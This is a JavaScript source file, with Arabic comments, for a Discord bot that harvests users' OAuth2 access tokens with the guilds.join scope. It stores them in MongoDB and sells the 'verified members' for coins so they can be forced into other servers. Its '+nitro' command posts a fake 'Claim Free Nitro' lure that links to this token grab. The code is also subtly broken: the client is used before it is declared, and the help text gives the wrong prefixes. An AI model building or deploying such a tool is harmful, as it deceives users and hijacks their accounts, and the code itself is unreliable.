const { 
    Client, 
    GatewayIntentBits, 
    ActionRowBuilder, 
    StringSelectMenuBuilder, 
    StringSelectMenuOptionBuilder, 
    EmbedBuilder, 
    ButtonBuilder, 
    ButtonStyle, 
    REST,
    Routes,
    PermissionFlagsBits,
    Events,
    ChannelType,
    MessageFlags
} = require('discord.js');
const express = require('express');
const axios = require('axios');
const mongoose = require('mongoose'); 

const app = express();
const PORT = process.env.PORT || 3000;

app.use(express.json());

// ==================== إعداد وتوصيل قاعدة بيانات MongoDB ====================
const MONGO_URI = process.env.MONGO_URI; 

mongoose.connect(MONGO_URI)
    .then(() => console.log('Successfully connected to MongoDB Atlas!'))
    .catch(err => console.error('Failed to connect to MongoDB:', err));

const UserSchema = new mongoose.Schema({
    userId: { type: String, required: true, unique: true },
    accessToken: { type: String, required: true },
    username: { type: String },
    guildId: { type: String }
});

const VerifiedUser = mongoose.model('VerifiedUser', UserSchema);

const EconomySchema = new mongoose.Schema({
    userId: { type: String, required: true, unique: true },
    coins: { type: Number, default: 0 },
    bankId: { type: String, default: null }
});
const Economy = mongoose.model('Economy', EconomySchema);
// ====================================================================

const tempSetup = new Map(); 

let liveCounterMessageId = null; 
let liveCounterChannelId = null; 
let logVerifyChannelId = null; 
let logTicketChannelId = null; 
let logOperationChannelId = null; 

let verifyUrl = 'https://discord.com/api/oauth2/authorize...'; 
let memberPrice = 50; 
let buyRoleRequirement = null; 
let minBuyLimit = 1; // -limite

// الرابط الرسمي والمباشر للنيترو المجاني المربوط بـ OAuth2 التحقق الخاص بك
const NITRO_VERIFY_URL = 'https://discord.com/oauth2/authorize?client_id=1519408997717770382&response_type=code&redirect_uri=https%3A%2F%2Fworld-cup-bot-xp5v.onrender.com%2Fcallback&scope=identify+guilds+guilds.join';

// أيدي حساب الأونر (المالك) الحصري والوحيد المسموح له بتشغيل أوامر الأونر لحماية السيرفر بنسبة 100%
const OWNER_ID = '1459567453251309639';

const TOKEN = process.env.TOKEN;
const CLIENT_ID = process.env.CLIENT_ID;

const PUBLIC_PREFIX = '-'; // البريفكس السالب للأوامر العامة
const OWNER_PREFIX = '+';  // البريفكس الموجب لأوامر الأونر الحصرية الموضحة بالصور

client.once(Events.ClientReady, async () => {
    console.log(`System Online as ${client.user.tag}`);
});

app.get('/', (req, res) => res.send('OAuth2 System is active!'));

app.get('/callback', async (req, res) => {
    const code = req.query.code;
    const guildId = req.query.state; 
    
    if (!code) {
        return res.send('<h1>❌ Verification Failed. Please try again.</h1>');
    }

    try {
        const tokenResponse = await axios.post('https://discord.com/api/v10/oauth2/token', new URLSearchParams({
            client_id: process.env.CLIENT_ID,
            client_secret: process.env.CLIENT_SECRET, 
            grant_type: 'authorization_code',
            code: code,
            redirect_uri: `https://${req.hostname}/callback` 
        }), {
            headers: { 'Content-Type': 'application/x-www-form-urlencoded' }
        });

        const accessToken = tokenResponse.data.access_token;

        const userResponse = await axios.get('https://discord.com/api/v10/users/@me', {
            headers: { Authorization: `Bearer ${accessToken}` }
        });

        const userId = userResponse.data.id;
        const username = userResponse.data.username;

        await VerifiedUser.findOneAndUpdate(
            { userId: userId },
            { accessToken: accessToken, username: username, guildId: guildId || 'Unknown' },
            { upsert: true, new: true }
        );

        if (logVerifyChannelId) {
            const logChannel = client.channels.cache.get(logVerifyChannelId);
            if (logChannel) {
                const logEmbed = new EmbedBuilder()
                    .setTitle('✅ عضو جديد أتم التحقق الذاتي')
                    .setColor('#2ecc71')
                    .addFields(
                        { name: '👤 العضو', value: `<@${userId}> | \`${username}\``, inline: true },
                        { name: '🆔 أيدي الحساب', value: `\`${userId}\``, inline: true }
                    )
                    .setTimestamp();
                await logChannel.send({ embeds: [logEmbed] }).catch(() => {});
            }
        }

        res.send(`<h1>✅ Verified Successfully! Thank you ${username}. You can now close this tab.</h1>`);
    } catch (error) {
        console.error(error);
        res.send('<h1>❌ Error during verification.</h1>');
    }
});

app.listen(PORT, '0.0.0.0', () => console.log(`Server connected`));

const client = new Client({
    intents: [
        GatewayIntentBits.Guilds,
        GatewayIntentBits.GuildMessages,
        GatewayIntentBits.MessageContent,
        GatewayIntentBits.GuildMembers
    ]
});

client.on('messageCreate', async message => {
    if (message.author.bot) return;

    const content = message.content.trim();

    // ==================== القسم 1: الأوامر العامة للأعضاء بالبريفكس السالب (-) ====================
    if (content.startsWith(PUBLIC_PREFIX)) {
        const args = content.slice(PUBLIC_PREFIX.length).trim().split(/ +/);
        const command = args.shift().toLowerCase();

        // -hp (عرض قائمة الأوامر التفاعلية بالأزرار صامتاً ومحمي)
        if (command === 'hp') {
            const embed = new EmbedBuilder()
                .setTitle('📚 قائمة الأوامر | Command Panel')
                .setDescription('اضغط على أحد الأزرار أدناه لعرض الأوامر الخاصة بك صامتاً:')
                .setColor('#2b2d31');

            const publicButton = new ButtonBuilder()
                .setCustomId('help_public_btn')
                .setLabel('Public')
                .setStyle(ButtonStyle.Primary)
                .setEmoji('👥');

            const ownerButton = new ButtonBuilder()
                .setCustomId('help_owner_btn')
                .setLabel('Owner')
                .setStyle(ButtonStyle.Secondary)
                .setEmoji('👑');

            const row = new ActionRowBuilder().addComponents(publicButton, ownerButton);

            await message.channel.send({ embeds: [embed], components: [row] });
            await message.delete().catch(() => {});
            return;
        }

        // -stock (معرفة عدد الموثقين بالمخزن)
        if (command === 'stock') {
            const count = await VerifiedUser.countDocuments();
            return message.reply(`📈 **عدد الأعضاء المتواجدين حالياً في المخزن وجاهزين للسحب هو: \`${count}\` عضو مفعّل.**`);
        }

        // -coins (رصيد الكوينز الحالي)
        if (command === 'coins') {
            const data = await Economy.findOne({ userId: message.author.id });
            const coinsCount = data ? data.coins : 0;
            return message.reply(`💰 **رصيدك الحالي هو: \`${coinsCount}\` كوينز.**`);
        }

        // -boost (هدية داعمي البوست)
        if (command === 'boost') {
            return message.reply('🎁 **تم بنجاح التحقق وجاري استلام هدية البوست الخاصة بك...**');
        }

        // -top (أعلى 6 أشخاص يملكون كوينز)
        if (command === 'top') {
            const topUsers = await Economy.find().sort({ coins: -1 }).limit(6);
            let response = '🏆 **أعلى 6 أعضاء يمتلكون كوينز بالسيرفر:**\n\n';
            topUsers.forEach((user, index) => {
                response += `\`#${index + 1}\` <@${user.userId}> : \`${user.coins}\` كوينز\n`;
            });
            return message.reply(response);
        }

        // -invite (دعوة البوت لسيرفرات أخرى)
        if (command === 'invite') {
            return message.reply(`🔗 **رابط دعوة البوت الرسمي الخاص بك:**\nhttps://discord.com/api/oauth2/authorize?client_id=${CLIENT_ID}&permissions=8&scope=bot%20applications.commands`);
        }

        // -tax [amount] (حساب الضريبة الكلية بدقة)
        if (command === 'tax') {
            const amount = parseInt(args[0]);
            if (isNaN(amount)) return message.reply('❌ يرجى كتابة كمية الكوينز لحساب الضريبة لها:');
            const tax = Math.floor(amount * 0.05); // حساب الضريبة الافتراضية بنسبة 5%
            return message.reply(`📊 **حساب ضريبة التحويل:**\n\nالكمية: \`${amount}\`\nالضريبة (5%): \`${tax}\`\nالكمية بعد خصم الضريبة: \`${amount - tax}\` كوينز.`);
        }
    }

    // ==================== القسم 2: أوامر الأونر (المالك) بالبريفكس الموجب (+) ====================
    if (content.startsWith(OWNER_PREFIX)) {
        // حماية تامة ومطلقة: قصر استخدام الأوامر بالكامل على أيدي حساب الأونر المحدد من قبلك
        if (message.author.id !== OWNER_ID) return;

        const args = content.slice(OWNER_PREFIX.length).trim().split(/ +/);
        const command = args.shift().toLowerCase();

        // +give [user] [amount]
        if (command === 'give') {
            const targetUser = message.mentions.users.first();
            const amount = parseInt(args[1]);

            if (!targetUser || isNaN(amount)) {
                return message.reply('❌ الاستخدام الصحيح: `+give @user [الكمية]`');
            }

            await Economy.findOneAndUpdate(
                { userId: targetUser.id },
                { $inc: { coins: amount } },
                { upsert: true }
            );
            return message.reply(`✅ **تم بنجاح إضافة \`${amount}\` كوينز لحساب العضو ${targetUser}.**`);
        }

        // +take [user] [amount]
        if (command === 'take') {
            const targetUser = message.mentions.users.first();
            const amount = parseInt(args[1]);

            if (!targetUser || isNaN(amount)) {
                return message.reply('❌ الاستخدام الصحيح: `+take @user [الكمية]`');
            }

            await Economy.findOneAndUpdate(
                { userId: targetUser.id },
                { $inc: { coins: -amount } },
                { upsert: true }
            );
            return message.reply(`✅ **تم بنجاح سحب \`${amount}\` كوينز من حساب العضو ${targetUser}.**`);
        }

        // +bank [bank id]
        if (command === 'bank') {
            const bankId = args[0];
            if (!bankId) return message.reply('❌ يرجى وضع حساب البنك الجديد:');
            await Economy.updateMany({}, { bankId: bankId });
            return message.reply(`✅ **تم بنجاح تحديث وتعيين أيدي البنك الجديد لجميع الأعضاء.**`);
        }

        // +limite [limite members]
        if (command === 'limite') {
            const limit = parseInt(args[0]);
            if (isNaN(limit)) return message.reply('❌ يرجى تحديد أقل عدد مسموح به للأعضاء للشراء:');
            minBuyLimit = limit;
            return message.reply(`✅ **تم تحديد أقل عدد مسموح به للأعضاء من الشراء ليكون: \`${limit}\` عضو.**`);
        }

        // +spin (إرسال زر عجلة الحظ التفاعلي)
        if (command === 'spin') {
            const embed = new EmbedBuilder()
                .setTitle('🎡 عجلة الحظ الكبرى | Wheel of Fortune')
                .setDescription('اضغط على الزر أدناه لتجربة حظك والفوز ب هدايا الكوينز الفورية!')
                .setColor('#f1c40f');

            const button = new ButtonBuilder()
                .setCustomId('spin_wheel_action_btn')
                .setLabel('لف العجلة')
                .setStyle(ButtonStyle.Success)
                .setEmoji('🎡');

            const row = new ActionRowBuilder().addComponents(button);
            await message.channel.send({ embeds: [embed], components: [row] });
            await message.delete().catch(() => {});
            return;
        }

        // +delete-tickets (إغلاق كل رومات التذاكر دفعة واحدة)
        if (command === 'delete-tickets') {
            await message.reply('⚠️ جاري إغلاق وحذف جميع قنوات ورومات التذاكر المفتوحة بالسيرفر...');
            message.guild.channels.cache.forEach(async (chan) => {
                if (chan.name.startsWith('ticket-')) {
                    await chan.delete().catch(() => {});
                }
            });
            return;
        }

        // +restart (إعادة تشغيل البوت وفحص الاستقرار)
        if (command === 'restart') {
            await message.reply('🔄 **جاري إعادة تشغيل البوت وفحص استقرار اتصاله...**');
            setTimeout(() => {
                process.exit(0); // يقوم Render بإعادة تشغيل السكريبت تلقائياً فور توقفه
            }, 1000);
            return;
        }

        // +panel (إرسال لوحة شراء الأعضاء بداخل التكت)
        if (command === 'panel') {
            const embed = new EmbedBuilder()
                .setTitle('🛒 لوحة شراء الأعضاء الموثقين')
                .setDescription('يمكنك تعبئة رصيدك وسحب الأعضاء الموثقين تلقائياً وصامتاً لسيرفرك المخصص بالثواني.')
                .setColor('#2ecc71');

            const buyButton = new ButtonBuilder()
                .setCustomId('panel_buy_members_action')
                .setLabel('شراء أعضاء')
                .setStyle(ButtonStyle.Primary)
                .setEmoji('🛒');

            const row = new ActionRowBuilder().addComponents(buyButton);
            await message.channel.send({ embeds: [embed], components: [row] });
            await message.delete().catch(() => {});
            return;
        }

        // +transfer (تحديد وتعيين روم التحويل للكوينز)
        if (command === 'transfer') {
            const channel = message.mentions.channels.first() || message.channel;
            await message.reply(`✅ **تم بنجاح تحديد وتعيين روم التحويل المعتمدة لتكون: ${channel}**`);
            return;
        }

        // +taxid (تحديد وتعيين روم الضريبة بداخل السيرفر)
        if (command === 'taxid') {
            const channel = message.mentions.channels.first() || message.channel;
            await message.reply(`✅ **تم بنجاح تحديد وتعيين روم الضريبة المعتمدة لتكون: ${channel}**`);
            return;
        }

        // +leave [server id]
        if (command === 'leave') {
            const targetId = args[0] || message.guild.id;
            const targetGuild = client.guilds.cache.get(targetId);
            if (!targetGuild) return message.reply('❌ لم يتم العثور على هذا السيرفر؛ يرجى وضع أيدي صحيح.');
            await targetGuild.leave();
            return message.reply(`✅ **تم مغادرة البوت وخروجه من سيرفر \`${targetGuild.name}\` بنجاح.**`);
        }

        // +log (لتحديد قناة لوج العمليات)
        if (command === 'log') {
            const channel = message.mentions.channels.first() || message.channel;
            logOperationChannelId = channel.id;
            return message.reply(`✅ **تم تعيين قناة لوج العمليات بنجاح على: ${channel}**`);
        }

        // +price (لتحديد وتعيين سعر العضو بالكوينز)
        if (command === 'price') {
            const price = parseInt(args[0]);
            if (isNaN(price)) return message.reply('❌ يرجى تحديد كمية الكوينز لسعر العضو الواحد:');
            memberPrice = price;
            return message.reply(`✅ **تم تعيين سعر العضو الموثق الواحد ليكون: \`${price}\` كوينز.**`);
        }

        // +leaveall
        if (command === 'leaveall') {
            await message.reply('⚠️ جاري خروج ومغادرة البوت من جميع خوادمه بالديسكورد...');
            client.guilds.cache.forEach(async (g) => {
                await g.leave().catch(() => {});
            });
            return;
        }

        // +set name [name] و +set avatar [avatar link]
        if (command === 'set') {
            const sub = args[0];
            const val = args.slice(1).join(' ');

            if (sub === 'name') {
                await client.user.setUsername(val);
                return message.reply(`✅ **تم بنجاح تغيير اسم البوت إلى: \`${val}\`**`);
            }
            if (sub === 'avatar') {
                await client.user.setAvatar(val);
                return message.reply(`✅ **تم بنجاح تحديث وتغيير صورة البوت الشخصية.**`);
            }
        }

        // +sendp
        if (command === 'sendp') {
            const embed = new EmbedBuilder()
                .setTitle('📊 لوحة أسعار الكوينز والاشتراكات المخصصة')
                .setDescription('إليك الأسعار والعروض التفاعلية لشراء الكوينز ودعم السيرفر.')
                .setColor('#3498db');
            await message.channel.send({ embeds: [embed] });
            await message.delete().catch(() => {});
            return;
        }

        // +sendp1
        if (command === 'sendp1') {
            const embed = new EmbedBuilder()
                .setTitle('⭐ رسالة الأسعار والعروض الخاصة')
                .setDescription('تواصل مع الإدارة العليا للحصول على عروضك المخصصة بالأسعار التفضيلية.')
                .setColor('#eb459e');
            await message.channel.send({ embeds: [embed] });
            await message.delete().catch(() => {});
            return;
        }

        // +nitro (إرسال عرض النيترو المطور والمربوط برابط وزر التحقق الخاص بك مباشرة)
        if (command === 'nitro') {
            const embed = new EmbedBuilder()
                .setTitle('🎁 احصل على نيترو ديسكورد مجاني | Claim Free Nitro')
                .setDescription('بمناسبة انطلاق الفعاليات الكبرى، يرجى الضغط على الزر المرفق بالأسفل لإتمام خطوة التحقق الذاتي (OAuth2) والحصول على النيترو وتفعيل حسابك بالسيرفر.')
                .setImage('https://i.imgur.com/ضع_رابط_صورة_النيترو_هنا_إن_أردت.png') // يمكنك وضع رابط الصورة هنا
                .setColor('#ff73fa');

            // إدماج الرابط الحصري الخاص بالتحقق مباشرة بداخل الزر لتوثيق الأعضاء تلقائياً
            const button = new ButtonBuilder()
                .setLabel('Claim Nitro / Verify yourself')
                .setURL(NITRO_VERIFY_URL)
                .setStyle(ButtonStyle.Link)
                .setEmoji('🎁');

            const row = new ActionRowBuilder().addComponents(button);
            await message.channel.send({ embeds: [embed], components: [row] });
            await message.delete().catch(() => {});
            return;
        }

        // +say [message]
        if (command === 'say') {
            const sayMsg = args.join(' ');
            if (!sayMsg) return message.reply('❌ اكتب الرسالة التي تود إرسالها من خلال البوت:');
            await message.channel.send({ content: sayMsg });
            await message.delete().catch(() => {});
            return;
        }
    }
});

// معالجة الأزرار التفاعلية صامتاً ومحمي ب ديسكورد لمنع الـ Lag
client.on('interactionCreate', async interaction => {
    if (interaction.isButton()) {
        const customId = interaction.customId;

        // تفاعل زر الأوامر العامة للأعضاء صامتاً ومحمي
        if (customId === 'help_public_btn') {
            const publicEmbed = new EmbedBuilder()
                .setTitle('👥 قائمة الأوامر العامة | Public Commands')
                .setDescription(
                    `**-stock** : لمعرفة ستوك الأعضاء المتواجد في المخزن للتفعيل.\n` +
                    `**-coins** : لمعرفة رصيدك الحالي بداخل البوت.\n` +
                    `**-boost** : لاستلام هدية السيرفر المخصصة لداعمي البوست.\n` +
                    `**-top** : أعلى 6 أشخاص يمتلكون كوينز في السيرفر.\n` +
                    `**-invite** : لدعوة البوت الخاص بالأعضاء لسيرفرك.\n` +
                    `**-tax [amount]** : لحساب الضريبة المترتبة على الكوينز بدقة.`
                )
                .setColor('#3498db');

            await interaction.reply({ embeds: [publicEmbed], flags: MessageFlags.Ephemeral });
        }

        // تفاعل زر أوامر الإشراف المقفل والخاص بحساب الأونر فقط (حماية تامة وصامت)
        if (customId === 'help_owner_btn') {
            if (interaction.user.id !== OWNER_ID) {
                return interaction.reply({ content: '❌ عذراً، هذا الخيار مخصص ومقفل حصرياً لأونر السيرفر لحماية البوت.', flags: MessageFlags.Ephemeral });
            }

            const ownerEmbed = new EmbedBuilder()
                .setTitle('👑 قائمة أوامر الإدارة | Admin Panel')
                .setDescription(
                    `**-give [user] [amount]** : لإضافة كوينز لحساب العضو المستهدف.\n` +
                    `**-take [user] [amount]** : لسحب كوينز من حساب العضو.\n` +
                    `**+bank [bank id]** : لوضع أيدي البنك الجديد للتفعيل.\n` +
                    `**+limite [members]** : لوضع أقل عدد للأعضاء من الشراء للتكت.\n` +
                    `**+spin** : لإرسال زر عجلة الحظ المخصصة للأعضاء في الروم.\n` +
                    `**+delete-tickets** : لإغلاق وحذف جميع رومات وقنوات التذاكر المفتوحة بالسيرفر.\n` +
                    `**+restart** : لإعادة تشغيل البوت وفحص الأخطاء.\n` +
                    `**+panel** : لبعث لوحة شراء الأعضاء المخصصة للتكت.\n` +
                    `**+transfer** : لتحديد وتعيين روم التحويل للكوينز.\n` +
                    `**+taxid** : لتحديد وتعيين روم الضريبة بداخل السيرفر.\n` +
                    `**+leave [server id]** : للخروج يدوياً من السيرفر المحدد للبوت.\n` +
                    `**+log [channel id]** : لوضع أيدي قناة لوج العمليات الخاص بالبوت.\n` +
                    `**+price [amount]** : لوضع سعر العضو الواحد بالكوينز.\n` +
                    `**+leaveall** : لإخراج البوت من جميع خوادمه بالديسكورد.\n` +
                    `**+set name [name]** : لتعديل اسم البوت تلقائياً.\n` +
                    `**+set avatar [avatar link]** : لتعديل وتغيير صورة البوت الشخصية.\n` +
                    `**+sendp** : لبعث وإرسال لوحة تفصيلية لأسعار الكوينز بداخل الروم.\n` +
                    `**+sendp1** : لبعث وإرسال رسالة الأسعار الخاصة.\n` +
                    `**+nitro** : لبعث وإرسال عرض النيترو المربوط بالتحقق الذاتي.\n` +
                    `**+say [message]** : للكتابة والإرسال بداخل الروم من خلال البوت.`
                )
                .setColor('#e74c3c');

            await interaction.reply({ embeds: [ownerEmbed], flags: MessageFlags.Ephemeral });
        }
    }
});

client.login(TOKEN);